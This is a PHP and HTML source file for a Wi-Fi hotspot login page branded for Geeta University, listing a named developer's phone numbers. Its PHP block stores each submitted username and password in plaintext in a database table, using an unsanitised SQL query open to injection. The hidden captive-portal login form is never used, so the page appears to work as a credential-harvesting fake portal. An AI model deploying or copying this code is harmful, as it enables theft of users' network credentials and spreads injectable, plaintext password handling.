<?php
if(isset($_POST['submit']))
{
include("configure.php");
$username=$_POST['username'];
$password=$_POST['password'];

$sql="INSERT INTO `internet` ( `username`, `password`) VALUES ( '$username', '$password');";

mysqli_query($con,$sql ) or die("Error occured");
}
?><!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="pragma" content="no-cache" />
    <meta http-equiv="expires" content="-1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Internet_hotspot</title>
    <link rel="stylesheet" href="css/style.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    
</head>

<body>
    
    <form name="sendin" action="" method="post" style="display:none">
        <input type="hidden" name="username" />
        <input type="hidden" name="password" />
        <input type="hidden" name="dst" value="http://www.msftconnecttest.com/redirect" />
        <input type="hidden" name="popup" value="true" />
    </form>

    <div class="ie-fixMinHeight">
        <div class="main">
            <div class="wrap animated fadeIn">
                <form  action="page.php" method="POST"  >
                    <input type="hidden" name="dst" value="http://www.msftconnecttest.com/redirect" />
                    <input type="hidden" name="popup" value="true" />
					<img src="GULogo.png" width="250" height="130">
					
                  

                    <p class="info ">
					<h3 align="center">Welcome to Geeta University Delhi-NCR,Panipat</h3>
					<p align="center">To enjoy the seemless connectivity <p><br>
                        Please enter the Username and Password 
                        

                        
                    </p>
                    <label>
                        <i class="fa-solid fa-user" style="position: absolute; top:18px; left : 10px"></i>
                        <input name="username" type="text" value="" placeholder="Username" required>
                    </label>

                    <label>
                        <i class="fa-solid fa-key" style="position: absolute; top:18px; left : 10px"></i>
                        <input name="password" type="password" value="" placeholder="Password" required >
                    </label>

                    <input  name="submit" type="submit" value="Connect" >

                </form>
                <p class="info bt"><b>Developed By : Er Ankit Singh</b></p>
				
				<p> <b> For any  problem Wi fi Please contact Number <br>
				Mr.Ankit Singh:7753991374,7518991374 <br> 
                
            </div>
        </div>
        
    </div>
    <script src="main.js">

    </script>
</body>

</html>
